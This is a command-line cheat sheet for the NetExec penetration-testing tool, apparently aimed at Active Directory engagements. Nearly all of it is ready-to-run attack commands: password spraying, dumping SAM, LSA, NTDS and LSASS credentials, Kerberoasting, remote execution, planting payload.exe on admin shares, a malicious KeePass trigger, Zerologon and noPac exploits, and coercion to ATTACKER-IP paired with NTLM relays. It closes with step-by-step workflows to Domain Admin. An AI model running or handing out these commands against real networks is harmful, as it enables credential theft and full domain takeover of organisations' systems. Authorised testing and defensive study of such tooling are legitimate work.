NetExec (nxc) Cheat Sheet

The successor to CrackMapExec — the swiss-army knife for authenticated post-exploitation and network enumeration across SMB, LDAP, WinRM, MSSQL, SSH, RDP, FTP, WMI, NFS, and VNC.

01Basics & Global Flags

Install / Update

# Kali (usually pre-installed)
sudo apt install netexec

# Latest from git (via pipx — recommended)
pipx install git+https://github.com/Pennyw0rth/NetExec
pipx upgrade netexec

# Check version and installed modules
nxc --version
nxc smb -L            # list SMB modules

Command shape

nxc PROTOCOL TARGET -u USER -p PASS [options] [-M module]

Auth patterns

TypeExample
Password-u user -p 'Pass123'
NT hash (PtH)-H 31d6cfe0d16ae931b73c59d7e0c089c0
Full LM:NT-H aad3b435...:31d6cfe0...
Domain-d corp.local (else use --local-auth)
Kerberos (TGT in ccache)--use-kcache (respects $KRB5CCNAME)
Kerberos (request new)-k -u user -p pass
AES key--aesKey <hex>
Null session-u '' -p ''
Guest-u guest -p ''

Target formats

10.10.10.100                # single IP
10.10.10.0/24               # CIDR
10.10.10.100-120            # range
targets.txt                 # file (one per line)
dc01.corp.local             # hostname / FQDN

Handy global flags

--continue-on-successKeep going after first hit — needed for password spraying
--no-bruteforceStop trying more passwords for a user after first success
-t 100Threads (default 100)
--jitter 5Random 0–5s delay between requests
-v / --verboseMore output
--debugFull noise for troubleshooting
-M NAME -o KEY=VALRun module with options
--log FILELog everything to a file

Database: results and creds are stored in ~/.nxc/. Use nxcdb to query them later — very useful for tracking a large engagement.

02SMB — the workhorse

Basic auth check & host recon

# Validate creds against a host or a whole subnet
nxc smb 10.10.10.0/24 -u user -p 'Pass123'

# Output tells you: hostname, domain, OS, SMB signing, SMBv1
#   SMB   10.10.10.5    445   DC01   [*] Windows Server 2019 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)
#   SMB   10.10.10.5    445   DC01   [+] corp.local\user:Pass123 (Pwn3d!)   ← Pwn3d! = local admin

# Null session — huge on old boxes
nxc smb 10.10.10.5 -u '' -p ''

Enumeration

# Shares (with read/write markers)
nxc smb TARGET -u user -p pass --shares

# Users, groups, computers, domain info
nxc smb TARGET -u user -p pass --users
nxc smb TARGET -u user -p pass --groups
nxc smb TARGET -u user -p pass --computers

# Live sessions and logged-on users → target hunting
nxc smb TARGET -u user -p pass --sessions
nxc smb TARGET -u user -p pass --loggedon-users

# Password policy — plan your spraying without lockouts
nxc smb TARGET -u user -p pass --pass-pol

# RID brute — enumerate users via null/guest session
nxc smb TARGET -u guest -p '' --rid-brute 4000

# Disks / installed shares
nxc smb TARGET -u user -p pass --disks

Command execution (local admin required)

# Auto-picks the best exec method
nxc smb TARGET -u user -p pass -x "whoami /priv"

# PowerShell (base64-encoded under the hood)
nxc smb TARGET -u user -p pass -X "Get-Process | ft"

# Force a specific exec method: wmiexec / smbexec / atexec / mmcexec
nxc smb TARGET -u user -p pass -x "whoami" --exec-method smbexec

# Get a real interactive-ish shell via impacket instead
impacket-psexec corp/user:pass@TARGET

Exec method reminder: psexec/smbexec/atexec ride SMB pipes (only need 445). wmiexec needs dynamic RPC (135 + high port). If SMB works but WMI doesn't, dynamic RPC is filtered.

Credential dumps (local admin required)

# SAM hashes (local accounts)
nxc smb TARGET -u admin -p pass --sam

# LSA secrets (cached domain creds, machine acct, autologon…)
nxc smb TARGET -u admin -p pass --lsa

# NTDS.dit — DOMAIN CONTROLLER ONLY, or via DCSync rights
nxc smb DC-IP -u admin -p pass --ntds
nxc smb DC-IP -u admin -p pass --ntds --users       # enabled users only
nxc smb DC-IP -u admin -p pass --ntds --enabled

# DPAPI blobs (browser saved passwords, credential manager)
nxc smb TARGET -u admin -p pass --dpapi

Files & shares

# Upload / download
nxc smb TARGET -u user -p pass --put-file ./payload.exe C\$\\Temp\\payload.exe
nxc smb TARGET -u user -p pass --get-file C\$\\Users\\admin\\Desktop\\flag.txt flag.txt

# Spider a share for interesting files (via module, more powerful)
nxc smb TARGET -u user -p pass -M spider_plus -o EXCLUDE_DIRS=Windows,PerfLogs

Password spraying

# Spray one password across many users (careful with lockouts)
nxc smb DC-IP -u users.txt -p 'Summer2026!' --continue-on-success

# Spray several passwords across several users
nxc smb DC-IP -u users.txt -p passes.txt --continue-on-success --no-bruteforce

Lockout warning: always run --pass-pol first if you can. Sprays on a domain with LockoutThreshold=3 will lock every account in the file. When in doubt, one carefully chosen password across all users beats multiple guesses per user.

03LDAP — the AD enum goldmine

Anything you'd do with BloodHound / ldapsearch / Get-ADUser — nxc's LDAP protocol probably has a flag for it.

Basic AD enum

nxc ldap DC-IP -u user -p pass --users
nxc ldap DC-IP -u user -p pass --groups
nxc ldap DC-IP -u user -p pass --active-users
nxc ldap DC-IP -u user -p pass --admin-count       # adminCount=1 (high-value)
nxc ldap DC-IP -u user -p pass --dc-list           # list all DCs

Kerberoasting & AS-REP roasting

# Kerberoast — dump TGS for any SPN account
nxc ldap DC-IP -u user -p pass --kerberoasting kerb.txt

# AS-REP roast — users with "Do not require Kerberos preauth"
nxc ldap DC-IP -u user -p pass --asreproast asrep.txt

# Crack:
hashcat -m 13100 kerb.txt rockyou.txt        # Kerberoast
hashcat -m 18200 asrep.txt rockyou.txt       # AS-REP

Weak / risky account states

nxc ldap DC-IP -u user -p pass --password-not-required
nxc ldap DC-IP -u user -p pass --trusted-for-delegation   # unconstrained delegation
nxc ldap DC-IP -u user -p pass --find-delegation         # constrained/RBCD too
nxc ldap DC-IP -u user -p pass --gmsa                     # readable gMSA passwords

BloodHound collection

# Full collection to JSON — drop straight into BloodHound / BloodHound-CE
nxc ldap DC-IP -u user -p pass \
    --bloodhound --collection All --dns-server DC-IP

LDAP signing & channel binding

# Are LDAP signing / LDAPS channel binding required? (relay pre-req check)
nxc ldap DC-IP -u user -p pass -M ldap-checker

04WinRM — clean shells

# Auth check (also confirms user is in "Remote Management Users" or local admin)
nxc winrm TARGET -u user -p pass

# Command / PS exec (no service, no dropped binary → quieter than psexec)
nxc winrm TARGET -u user -p pass -x "whoami /all"
nxc winrm TARGET -u user -p pass -X "Get-LocalGroupMember Administrators"

# Pass-the-hash
nxc winrm TARGET -u user -H <NTHASH>

# Interactive shell → evil-winrm
evil-winrm -i TARGET -u user -p 'pass'
evil-winrm -i TARGET -u user -H <NTHASH>

WinRM is default disabled on workstations. Servers often have it on for admin scripting. If port 5985/5986 is closed, that's why.

05MSSQL

# Auth check (SQL account)
nxc mssql TARGET -u sa -p 'Password1' --local-auth

# Auth check (Windows integrated)
nxc mssql TARGET -u user -p pass -d corp.local

# Run a T-SQL query
nxc mssql TARGET -u sa -p pass -q "SELECT @@version"
nxc mssql TARGET -u sa -p pass -q "SELECT name FROM sys.databases"

# OS command via xp_cmdshell (auto-enables if you have rights)
nxc mssql TARGET -u sa -p pass -x "whoami"

# PowerShell one-liner
nxc mssql TARGET -u sa -p pass -X "whoami; hostname"

# Common modules
nxc mssql TARGET -u sa -p pass -M mssql_priv       # check exec / impersonate paths
nxc mssql TARGET -u sa -p pass -M nanodump         # LSASS via SQL

MSSQL running as SYSTEM/NetworkService with xp_cmdshell = instant SYSTEM shell on the box. Even non-sysadmin accounts can sometimes exec via EXECUTE AS chains.

06SSH

# Password auth
nxc ssh TARGET -u user -p pass

# Key auth
nxc ssh TARGET -u user --key-file id_rsa

# Command exec
nxc ssh TARGET -u user -p pass -x "id; uname -a; sudo -l"

# Spray across a subnet with one password
nxc ssh 10.10.10.0/24 -u root -p 'toor' --continue-on-success

07Other protocols

RDP (mostly credential validation)

nxc rdp TARGET -u user -p pass
nxc rdp TARGET -u user -H <NTHASH>    # restricted admin mode

# Screenshot the login screen (recon a locked host)
nxc rdp TARGET -u user -p pass --screenshot

FTP

nxc ftp TARGET -u anonymous -p ''
nxc ftp TARGET -u user -p pass --ls /
nxc ftp TARGET -u user -p pass --get file.txt

NFS

# List exports (no auth) + enum
nxc nfs TARGET
nxc nfs TARGET --enum-shares
nxc nfs TARGET --list-contents --share /exports/home

WMI

# Runs over DCOM — needs 135 + dynamic RPC reachable
nxc wmi TARGET -u user -p pass -x "whoami"

VNC

nxc vnc TARGET -p password

08Modules that punch above their weight

List every module for a protocol with -L. Show a specific module's options with -M name --options. Pass options with -o KEY=VAL.

nxc smb -L
nxc smb -M gpp_password --options

Credential loot

gpp_password

Decrypt legacy Groups.xml cpassword values from SYSVOL (pre-MS14-025 leftovers).

gpp_autologin

Pull auto-logon credentials from Registry.xml in GPO.

laps

Read LAPS-managed local admin passwords (needs read rights on the attribute).

lsassy

Dump LSASS remotely and parse creds — the classic post-admin move.

nanodump

Stealthier LSASS dump using nanodump technique.

procdump

Sysinternals-flavoured LSASS dump.

handlekatz

Duplicate LSASS handles + dump; frequently bypasses EDR that hooks OpenProcess.

mimikatz

Run mimikatz commands remotely (loud).

masky

Abuse ADCS to retrieve NT hashes for domain users via PKINIT.

keepass_discover

Locate KeePass databases + config on shares.

keepass_trigger

Add a malicious trigger to KeePass config → next open dumps DB in cleartext.

wireless / wifi

Pull saved WiFi credentials (PSK) from the host.

dpapi

Decrypt DPAPI blobs (browser saved passwords, RDP creds) using masterkeys.

veeam

Extract stored creds from Veeam Backup & Replication DB.

iis

Dump IIS app pool creds & encrypted web.config sections.

Enum / recon modules

spider_plus

Recursive share crawler with filters, hashing, metadata — replaces old --spider.

enum_av

Detect AV / EDR product running.

enum_dns

Enumerate DNS records over LDAP.

subnets

Discover internal subnets registered in AD Sites & Services.

user-desc

Read the description field on user accounts — passwords hide here.

adcs

List AD Certificate Services CAs and templates.

pso

Read Fine-Grained Password Policies.

whoami

LDAP "whoami" — shows how the DC sees your session (memberships, SIDs).

Action modules (attack / privilege)

add_computer

Add a machine account (default quota 10) — building block for RBCD attacks.

change-password

Force-change a user's password (needs the right).

install_elevated

Check if AlwaysInstallElevated is set → any user → SYSTEM via MSI.

zerologon

Check + optionally exploit CVE-2020-1472.

nopac

Check + exploit CVE-2021-42278 / CVE-2021-42287 (sAMAccountName spoofing).

petitpotam

Coerce authentication via EFSRPC — use with ntlmrelayx.

coerce_plus

All-in-one coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce…).

printerbug

Coerce via MS-RPRN (SpoolSample).

drop-sc

Drop a shortcut file into a share — triggers auth on open.

Common option-passing patterns

# Dump LSASS with lsassy and parse
nxc smb TARGET -u admin -p pass -M lsassy

# LAPS read (needs perms on ms-Mcs-AdmPwd / msLAPS-Password)
nxc ldap DC-IP -u user -p pass -M laps

# Decrypt GPP cpassword from every reachable SYSVOL
nxc smb DC-IP -u user -p pass -M gpp_password

# Add a computer account (default quota lets any user add 10)
nxc smb DC-IP -u user -p pass \
    -M add_computer -o NAME=PWN$ PASSWORD='Pwn3d!'

# Zerologon check (safe by default)
nxc smb DC-IP -u '' -p '' -M zerologon

09Kerberos usage

Prereqs on the attacker box

# Time sync with the DC — Kerberos hates clock skew > 5 min
sudo ntpdate DC-IP

# DC as DNS resolver (or add to /etc/hosts)
echo "10.10.10.5 DC01.corp.local corp.local" | sudo tee -a /etc/hosts

# /etc/krb5.conf minimal entry
[realms]
    CORP.LOCAL = {
        kdc = DC01.corp.local
    }

Getting & using tickets

# Request a TGT with password
impacket-getTGT corp.local/user:'pass'
export KRB5CCNAME=$(pwd)/user.ccache

# Use the ticket with nxc
nxc smb dc01.corp.local --use-kcache

# Or let nxc handle everything with -k
nxc smb dc01.corp.local -u user -p pass -k

# Kerberos with hash → overpass-the-hash
impacket-getTGT corp.local/user -hashes :NTHASH

Always use the DC's hostname/FQDN as the target, not the IP, when using -k — Kerberos SPNs are hostname-based.

10Coercion + NTLM relay

The classic combo: force a Windows machine to authenticate to a box you control, then relay that auth somewhere useful (LDAP, ADCS, SMB signing-off host).

Attacker side (impacket)

# Relay to LDAP → add a computer / RBCD
impacket-ntlmrelayx -t ldaps://DC-IP --delegate-access --no-smb-server --http-port 80

# Relay to ADCS Web Enrollment (ESC8) → cert as victim
impacket-ntlmrelayx -t http://CA-IP/certsrv/certfnsh.asp --adcs --template DomainController

# Relay to SMB (signing must be OFF on target)
impacket-ntlmrelayx -t smb://TARGET -smb2support -c 'whoami'

Trigger side (nxc)

# PetitPotam (EFSRPC) — coerce DC$ to auth to attacker
nxc smb DC-IP -u user -p pass -M petitpotam -o LISTENER=ATTACKER-IP

# All-in-one — tries every known coerce method
nxc smb DC-IP -u user -p pass -M coerce_plus -o LISTENER=ATTACKER-IP

# PrinterBug (Spool RPC)
nxc smb TARGET -u user -p pass -M printerbug -o LISTENER=ATTACKER-IP

11Realistic workflows

New subnet, zero context

# 1. Fingerprint everything — hostname, OS, signing, SMBv1
nxc smb 10.10.10.0/24

# 2. Null / guest sessions — free info
nxc smb 10.10.10.0/24 -u '' -p '' --shares
nxc smb 10.10.10.0/24 -u guest -p '' --rid-brute

# 3. Check for the obvious CVE-2020-1472
nxc smb DC-IP -u '' -p '' -M zerologon

First domain user in hand → full AD picture

# 1. Grab the policy so you don't lock accounts
nxc smb DC-IP -u user -p pass --pass-pol

# 2. Dump users, roast SPNs and preauth-less users
nxc ldap DC-IP -u user -p pass --users -o users.txt
nxc ldap DC-IP -u user -p pass --kerberoasting kerb.txt
nxc ldap DC-IP -u user -p pass --asreproast asrep.txt

# 3. Loot low-hanging fruit
nxc smb DC-IP -u user -p pass -M gpp_password
nxc ldap DC-IP -u user -p pass -M user-desc
nxc ldap DC-IP -u user -p pass -M laps

# 4. Feed BloodHound
nxc ldap DC-IP -u user -p pass \
    --bloodhound --collection All --dns-server DC-IP

# 5. Spray creds across the domain (find reuse)
nxc smb 10.10.10.0/24 -u user -p pass --continue-on-success

Local admin somewhere → escalate to DA

# 1. Confirm scope of the admin creds — where do they reach?
nxc smb 10.10.10.0/24 -u admin -p pass --local-auth --continue-on-success

# 2. Dump creds on every Pwn3d! host
nxc smb pwned.txt -u admin -p pass --local-auth --sam --lsa
nxc smb pwned.txt -u admin -p pass --local-auth -M lsassy

# 3. Anywhere a Domain Admin was logged in → their hash is now in your loot
# 4. Use it against the DC
nxc smb DC-IP -u Administrator -H <DA_NTHASH> --ntds

Password spraying safely

# 1. Get policy: LockoutThreshold, LockoutWindow, PasswordHistory
nxc smb DC-IP -u user -p pass --pass-pol

# 2. Enumerate valid users (RID brute or LDAP)
nxc ldap DC-IP -u user -p pass --active-users

# 3. Spray ONE well-chosen password across ALL users, add jitter
nxc smb DC-IP -u users.txt -p 'Summer2026!' \
    --continue-on-success --jitter 3
